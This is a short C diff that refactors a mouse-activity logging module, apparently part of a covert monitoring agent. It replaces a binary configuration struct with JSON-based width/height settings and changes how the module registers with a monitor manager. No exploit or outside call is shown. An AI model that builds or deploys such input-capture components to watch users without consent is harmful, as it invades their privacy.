@@ -5,12 +5,6 @@
 #define DEFAULT_MOUSE_Y_CAP 40
 DWORD mouse_x_cap = 0, mouse_y_cap = 0;
 
-// struttura di configurazione nel file
-typedef struct _mouse_conf {
-	DWORD mouse_x_cap;
-	DWORD mouse_y_cap;
-} mouse_conf;
-
 DWORD __stdcall PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	int xPos, yPos;
@@ -39,28 +33,16 @@ DWORD __stdcall PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_MouseLogInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_MouseLogInit(JSONObject elem)
 {
-	mouse_conf *mouse_conf_ptr = (mouse_conf *)conf_ptr;
-	if (mouse_conf_ptr) {
-		mouse_x_cap = mouse_conf_ptr->mouse_x_cap;
-		mouse_y_cap = mouse_conf_ptr->mouse_y_cap;
-	} else {
-		mouse_x_cap = DEFAULT_MOUSE_X_CAP;
-		mouse_y_cap = DEFAULT_MOUSE_Y_CAP;
-	}
+	mouse_x_cap = (DWORD) elem[L"width"]->AsNumber();
+	mouse_y_cap = (DWORD) elem[L"height"]->AsNumber();
 
-	PM_MouseLogStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_MouseLogRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_MOUSEAGENT, (BYTE *)PM_MouseLogDispatch, (BYTE *)PM_MouseLogStartStop, (BYTE *)PM_MouseLogInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_MouseLogInit(NULL, FALSE);
+	AM_MonitorRegister(L"mouse", PM_MOUSEAGENT, (BYTE *)PM_MouseLogDispatch, (BYTE *)PM_MouseLogStartStop, (BYTE *)PM_MouseLogInit, NULL);
 }
